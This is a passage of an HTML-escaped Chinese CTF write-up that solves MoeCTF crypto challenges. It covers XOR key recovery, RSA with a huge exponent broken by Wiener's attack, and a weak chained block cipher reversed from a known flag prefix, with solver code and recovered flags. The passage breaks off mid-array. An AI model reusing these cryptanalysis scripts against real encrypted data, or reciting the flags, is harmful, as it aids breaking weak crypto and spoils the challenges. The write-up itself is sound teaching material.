&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;f!JoxiM&amp;#39;, 14) 56
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;e_x0r_0&amp;#39;, 14) 24
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;r_0Pear&amp;#39;, 13) 28
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;mastere&amp;#39;, 13) 13
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;f!M3rux&amp;#39;, 13) 45
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;eart0r!&amp;#39;, 13) 32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_master&amp;#39;, 13) 12
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_0Peart&amp;#39;, 13) 29
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;0U_HaVe&amp;#39;, 13) 5
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;!M3rux9&amp;#39;, 13) 46
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;ux9G9Vf&amp;#39;, 12) 50
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;stered_&amp;#39;, 12) 15
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;W0W_y0U&amp;#39;, 12) 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;HaVe_ma&amp;#39;, 12) 8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;lJf!M3r&amp;#39;, 11) 43
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;art0r!_&amp;#39;, 11) 33
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;iYlJf!M&amp;#39;, 10) 41
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Dh6&amp;gt;Lof&amp;#39;, 10) 58
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;!_0iYlJ&amp;#39;, 10) 38
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;y0U_HaV&amp;#39;, 9) 4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;x9G9Vf!&amp;#39;, 9) 51
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;t0r!_0i&amp;#39;, 9) 35
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;r!_0iYl&amp;#39;, 9) 37
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;e_maste&amp;#39;, 9) 11
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;aVe_mas&amp;#39;, 9) 9
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Vf!Joxi&amp;#39;, 9) 55
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Ve_mast&amp;#39;, 9) 10
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;M3rux9G&amp;#39;, 9) 47
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;0r!_0iY&amp;#39;, 9) 36
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;tered_t&amp;#39;, 8) 16
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;rux9G9V&amp;#39;, 8) 49
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;kf&amp;lt;#1q:&amp;#39;, 8) 32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Peart0r&amp;#39;, 8) 31
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;G9Vf!Jo&amp;#39;, 8) 53
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_HaVe_m&amp;#39;, 7) 7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_0iYlJf&amp;#39;, 7) 39
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;9G9Vf!J&amp;#39;, 7) 52
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~bejYmV&amp;#39;, 6) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~I-Mc|j&amp;#39;, 6) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}r$o^!R&amp;#39;, 6) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;y=Xis$V&amp;#39;, 6) 56
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;tc-xB!N&amp;#39;, 6) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;pe+=XnM&amp;#39;, 6) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;XHG3P*@&amp;#39;, 6) 6
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Wi!2l`d&amp;#39;, 6) 14
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;W_y0U_H&amp;#39;, 6) 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Vq-Krsc&amp;#39;, 6) 55
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Jf!M3ru&amp;#39;, 6) 44
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;ErP*6=@&amp;#39;, 6) 23
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;=u;&#x2F;8D&amp;quot;&amp;#39;, 6) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;=Gj3t;&#x2F;&amp;#39;, 6) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;;Y0Zx2y&amp;#39;, 6) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;2\\|3o&amp;lt;=&amp;#39;, 6) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;1s0oYo]&amp;#39;, 6) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}\\)Db|q&amp;#39;, 5) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|o:xp_:&amp;#39;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|f;kpN#&amp;#39;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;xR+Kt,j&amp;#39;, 5) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;x0=GhV)&amp;#39;, 5) 18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;wQeDt=l&amp;#39;, 5) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;re*L=Pa&amp;#39;, 5) 18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;mb+OoEd&amp;#39;, 5) 18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;kObFkh&amp;gt;&amp;#39;, 5) 28
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;k7=1D=h&amp;#39;, 5) 35
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;j~\\7F14&amp;#39;, 5) 21
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;jy(D=Hl&amp;#39;, 5) 18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;i^80I@&amp;quot;&amp;#39;, 5) 24
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;h_#Cl$:&amp;#39;, 5) 28
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;gZFgyW]&amp;#39;, 5) 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;gYvgHC9&amp;#39;, 5) 24
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;gFtSiRf&amp;#39;, 5) 20
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;`f2&amp;#39;=`&amp;#39;&amp;quot;, 5) 46
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;\\d[7^&#x2F;6&amp;#39;, 5) 21
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;[{&amp;amp;#{we&amp;#39;, 5) 13
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;WkVf&amp;amp;U*&amp;#39;, 5) 42
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Wh=}Pnt&amp;#39;, 5) 58
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;Vc+jAmb&amp;#39;, 5) 58
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;V4xJLib&amp;#39;, 5) 58
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;LixuJof&amp;#39;, 5) 58
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;HzBvxNX&amp;#39;, 5) 23
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;CcFpC95&amp;#39;, 5) 21
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;?Ksais&amp;quot;&amp;#39;, 5) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;=qbj&#x2F;A=&amp;#39;, 5) 34
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;;d*]1+w&amp;#39;, 5) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;9&amp;#39;,`%Yu&amp;quot;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;3r&amp;#39;&#x2F;?\\;&amp;quot;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;3p9j4L0&amp;#39;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;3j%z$N&amp;#39;&amp;quot;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;0kuc5J&amp;#39;&amp;quot;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;0f&amp;#39;&#x2F;6^;&amp;quot;, 5) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;+s;J,D}&amp;#39;, 5) 20
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;+Z&amp;amp;PkAu&amp;#39;, 5) 20
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;*w7|QjE&amp;#39;, 5) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;)sz|o:x&amp;#39;, 5) 45
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;&amp;quot;w&amp;lt;mjq|&amp;#39;, 5) 13
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;&amp;quot;M&amp;lt;v,i`&amp;#39;, 5) 13
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;!JoxiMl&amp;#39;, 5) 57
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~twQ=Si&amp;#39;, 4) 50
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~]h3hr2&amp;#39;, 4) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~Emahq}&amp;#39;, 4) 11
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~6B-N+r&amp;#39;, 4) 27
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;~%X(s;c&amp;#39;, 4) 45
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}utsum(&amp;#39;, 4) 14
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}s+%dgD&amp;#39;, 4) 15
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}oK*);[&amp;#39;, 4) 23
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}hm=xeL&amp;#39;, 4) 15
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}U,do=y&amp;#39;, 4) 11
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;}6ds&amp;gt;H3&amp;#39;, 4) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|~-]2,\\&amp;#39;, 4) 36
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|uWkVf&amp;amp;&amp;#39;, 4) 40
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|oZ&amp;amp;R-R&amp;#39;, 4) 19
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|lkf&amp;lt;#1&amp;#39;, 4) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;|hA{M|&amp;#39;&amp;quot;, 4) 40
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|cyeu_v&amp;#39;, 4) 16
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|ZD`0U_&amp;#39;, 4) 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;quot;|Tjw&amp;lt;&amp;#39;7&amp;quot;, 4) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|SxJ(nR&amp;#39;, 4) 41
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|Qqau:?&amp;#39;, 4) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|Qa&amp;quot;L8m&amp;#39;, 4) 54
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|Me@kz?&amp;#39;, 4) 9
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|L.+H}&amp;amp;&amp;#39;, 4) 43
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;|Fm~u89&amp;#39;, 4) 30
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;最后拼出来的 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;giant-e&quot;&gt;giant_e&lt;a class=&quot;zola-anchor&quot; href=&quot;#giant-e&quot; aria-label=&quot;Anchor link for: giant-e&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;orisano&#x2F;owiener&#x2F;master&#x2F;owiener.py&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;当 e 很大的时候，d 就挺小&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import owiener
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = 0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = 0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = owiener.attack(e, n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(pow(c, d, n)))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ez-chain&quot;&gt;ez_chain&lt;a class=&quot;zola-anchor&quot; href=&quot;#ez-chain&quot; aria-label=&quot;Anchor link for: ez-chain&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def blockize(long):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    out = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    while long &amp;gt; 0:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        out.append(long % base)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        long &#x2F;&#x2F;= base
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return list(reversed(out))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;blocks = blockize(m)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;blockize()&lt;&#x2F;code&gt; 函数会将传入的 long 值由十进制转换成 base 进制，在本题中 base 如下。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;base = bytes_to_long(b&amp;quot;koito&amp;quot;) = 461430682735
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过以下题目内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;assert len(flag) == 72
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(encrypt_block_cbc(blocks, iv, key))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# [8490961288, 122685644196, 349851982069, 319462619019, 74697733110, 43107579733, 465430019828, 178715374673, 425695308534, 164022852989, 435966065649, 222907886694, 420391941825, 173833246025, 329708930734]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得知 flag 共 72 字符，转 base 进制后共 15 位，最高位是 $461430682735^{14}$ ，又因为 flag 的前七个字符为 &lt;code&gt;moectf{&lt;&#x2F;code&gt; ，通过以下代码&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;first = &amp;quot;moectf{0}{1}{2}&amp;quot;.format(&amp;#39;{&amp;#39;, &amp;#39;1&amp;#39; * 64, &amp;#39;}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;second = &amp;quot;moectf{0}{1}{2}&amp;quot;.format(&amp;#39;{&amp;#39;, &amp;#39;b&amp;#39; * 64, &amp;#39;}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(&amp;quot;moectf{0}{1}{2}&amp;quot;.format(&amp;#39;{&amp;#39;, &amp;#39;1&amp;#39; * 64, &amp;#39;}&amp;#39;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(&amp;quot;moectf{0}{1}{2}&amp;quot;.format(&amp;#39;{&amp;#39;, &amp;#39;5&amp;#39; * 64, &amp;#39;}&amp;#39;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(blockize(bytes_to_long(first.encode())))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(blockize(bytes_to_long(second.encode())))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[5329712293, 126494098340, 153597856955, 242892191641, 28680140924, 170513630989, 14482395232, 413336526109, 440072292209, 238157420150, 359568109605, 336722793770, 114932087705, 442402117522, 155888680347]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[5329712293, 126494113681, 412307442966, 223567461220, 265567505631, 283536975878, 441347697513, 92786431363, 341104088824, 89919877328, 103798180169, 361771096704, 429900835874, 213202888672, 337161076933]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以发现数组的第一个值都是 &lt;code&gt;5329712293&lt;&#x2F;code&gt; ，因此可以推断出 &lt;code&gt;blocks[0]&lt;&#x2F;code&gt; 的值就是 &lt;code&gt;5329712293&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;又因为 $encrypted[0] = blocks[0],\oplus,iv,\oplus,key $ ，反推即可得到 $key = blocks[0],\oplus,iv,\oplus,encrypted[0] $ 。&lt;&#x2F;p&gt;
&lt;p&gt;通过上述式子就可以得到 key 值为 &lt;code&gt;421036458&lt;&#x2F;code&gt; ，实现代码如下。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;first = &amp;quot;moectf{0}{1}{2}&amp;quot;.format(&amp;#39;{&amp;#39;, &amp;#39;1&amp;#39; * 64, &amp;#39;}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;iv = 3735927943
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = blockize(bytes_to_long(first.encode()))[0] ^ 8490961288 ^ iv
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(key) # 421036458
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到 key 后就可以通过 $blocks[i] = encrypted[i],\oplus,encrypted[i-1],\oplus,key $ 一路逆推出整个 blocks 数组，最后再编写一个 base 进制转十进制的函数进行转换最后再用 &lt;code&gt;long_to_bytes()&lt;&#x2F;code&gt; 函数转就可以得到 flag 了，实现代码如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes, bytes_to_long
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = 421036458
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;iv = 3735927943
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;base = bytes_to_long(b&amp;quot;koito&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;encrypted_blocks_with_iv = [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    3735927943, 8490961288, 122685644196, 349851982069, 319462619019,
